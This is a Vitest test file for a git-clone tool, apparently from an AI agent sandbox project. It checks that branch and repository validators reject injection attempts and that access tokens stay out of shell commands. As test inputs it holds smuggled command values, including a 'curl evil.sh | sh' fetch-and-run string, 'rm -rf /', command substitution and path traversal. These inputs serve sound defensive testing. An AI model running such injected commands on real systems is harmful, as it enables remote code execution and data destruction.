import { describe, expect, it, vi } from "vitest";
import type { Executor } from "../../executors/interface.js";
import { buildCloneCommand } from "../../executors/git-clone-command.js";
import { createGitCloneTool, isValidRef, isValidRepo } from "../git-clone.js";

const TOKEN = "ghs_supersecrettoken000000000000000000";

/**
 * Executor stub that records every exec() command and cloneRepo() call, so the
 * assertions below are about exactly what would reach the sandbox.
 */
function stubExecutor() {
  const commands: string[] = [];
  const clones: Array<{ url: string; path: string; ref?: string; password?: string }> = [];
  const executor: Executor = {
    init: vi.fn(async () => {}),
    isReady: () => true,
    getWorkspacePath: () => "/workspace",
    exec: vi.fn(async (command: string) => {
      commands.push(command);
      return { stdout: "abc1234 initial commit", stderr: "", code: 0 };
    }),
    writeFile: vi.fn(async () => {}),
    readFile: vi.fn(async () => ""),
    destroy: vi.fn(async () => {}),
    hasNativeGit: () => true,
    cloneRepo: vi.fn(async (url, path, options) => {
      clones.push({ url, path, ref: options?.ref, password: options?.password });
    }),
  };
  return { executor, commands, clones };
}

function stubTokenFetch() {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async () =>
        new Response(JSON.stringify({ token: TOKEN, github_username: "octocat" }), {
          status: 200,
        }),
    ),
  );
}

async function run(params: { label: string; repo: string; ref?: string }) {
  const { executor, commands, clones } = stubExecutor();
  stubTokenFetch();
  const tool = createGitCloneTool("ws_1", "http://ui.test", executor);
  const result = await tool.execute({} as never, params as never);
  const text = result.content.map((c) => ("text" in c ? c.text : "")).join("\n");
  return { text, commands, clones };
}

describe("ref validation", () => {
  it.each([
    ['main" ; curl evil.sh | sh ; "', "shell metacharacters"],
    ["$(id)", "command substitution"],
    ["`id`", "backticks"],
    ["--upload-pack=evil", "leading dash is parsed by git as an option"],
    ["../../etc/passwd", "path traversal"],
    ["feature/", "trailing slash"],
    ["refs/heads/x.lock", ".lock suffix"],
  ])("rejects %j (%s)", (ref) => {
    expect(isValidRef(ref)).toBe(false);
  });

  it.each(["main", "v1.2.3", "feature/my-branch", "release-2026.08", "a1b2c3d4e5f6"])(
    "accepts legitimate ref %j",
    (ref) => {
      expect(isValidRef(ref)).toBe(true);
    },
  );
});

describe("repo validation", () => {
  it.each(["owner/repo; rm -rf /", "owner/../../etc", "owner", "a/b/c", "own er/repo"])(
    "rejects %j",
    (repo) => {
      expect(isValidRepo(repo)).toBe(false);
    },
  );

  it.each(["traceroot-ai/traceroot", "owner/repo.name", "a_b/c-d"])("accepts %j", (repo) => {
    expect(isValidRepo(repo)).toBe(true);
  });
});

describe("git_clone tool", () => {
  it("refuses a hostile ref without touching the sandbox", async () => {
    const { text, clones } = await run({
      label: "x",
      repo: "traceroot-ai/traceroot",
      ref: 'main" ; curl evil.sh | sh ; "',
    });
    expect(text).toContain("Invalid ref");
    expect(clones).toHaveLength(0);
  });

  it("refuses a hostile repo without touching the sandbox", async () => {
    const { text, clones } = await run({ label: "x", repo: "owner/repo; rm -rf /" });
    expect(text).toContain("Invalid repository");
    expect(clones).toHaveLength(0);
  });

  it("clones a legitimate repo through cloneRepo", async () => {
    const { clones } = await run({
      label: "x",
      repo: "traceroot-ai/traceroot",
      ref: "feature/my-branch",
    });
    expect(clones).toHaveLength(1);
    expect(clones[0].url).toBe("https://github.com/traceroot-ai/traceroot.git");
    expect(clones[0].ref).toBe("feature/my-branch");
  });

  it("never puts the token in a shell command", async () => {
    const { commands } = await run({ label: "x", repo: "traceroot-ai/traceroot", ref: "main" });
    for (const command of commands) {
      expect(command).not.toContain(TOKEN);
    }
  });
});

describe("buildCloneCommand", () => {
  it("keeps every caller value out of the command string", () => {
    const { command, env } = buildCloneCommand({
      url: "https://github.com/o/r.git",
      dest: "/workspace/repos/o_r",
      ref: 'main" ; id ; "',
      password: TOKEN,
    });
    expect(command).not.toContain(TOKEN);
    expect(command).not.toContain("id ;");
    expect(command).not.toContain("/workspace/repos/o_r");
    expect(command).toContain('"$GIT_REF"');
    expect(command).toContain('"$GIT_URL"');
    expect(env.GIT_PASSWORD).toBe(TOKEN);
  });

  it("uses -- so a ref can never be read as an option", () => {
    const { command } = buildCloneCommand({ url: "u", dest: "d" });
    expect(command).toContain('-- "$GIT_URL" "$GIT_DEST"');
  });

  it("clones then checks out for a commit SHA", () => {
    const { command } = buildCloneCommand({ url: "u", dest: "d", ref: "a1b2c3d4e5f6" });
    expect(command).toContain("checkout");
    expect(command).not.toContain("--branch");
  });

  it("neutralizes inherited credential helpers and repo hooks", () => {
    const { command } = buildCloneCommand({ url: "u", dest: "d" });
    expect(command).toContain("credential.helper=");
    expect(command).toContain("core.hooksPath=/dev/null");
  });
});
